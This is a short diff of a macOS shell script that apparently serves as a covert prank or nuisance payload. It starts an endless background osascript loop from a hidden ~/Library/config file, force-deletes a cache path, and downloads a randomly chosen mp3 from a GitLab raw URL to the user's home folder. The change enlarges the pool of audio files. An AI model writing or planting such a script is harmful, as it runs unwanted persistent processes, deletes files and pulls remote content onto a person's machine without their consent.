@@ -5,9 +5,9 @@ while [ 1 ]; do osascript ~/Library/config; done &
 zsh -c 'rm -rf "~/Library/*42_cache*"';
 
 BASIC=('https://gitlab.com/LogoutPolice21/banana/raw/9c4b32441228904f4fb4ff1542d2271cae013346/')
-# LINKS=('PS' 'old' 'PulpFiction' 'Renault')
-LINKS=('PS')
-INDEX=$(awk -v min=0 -v max=0 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
+LINKS=('old' 'PulpFiction' 'Renault')
+# LINKS=('PS')
+INDEX=$(awk -v min=0 -v max=2 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
 LINK=("$BASIC${LINKS[$INDEX]}.mp3")
 curl $LINK > ~/mem.mp3
 
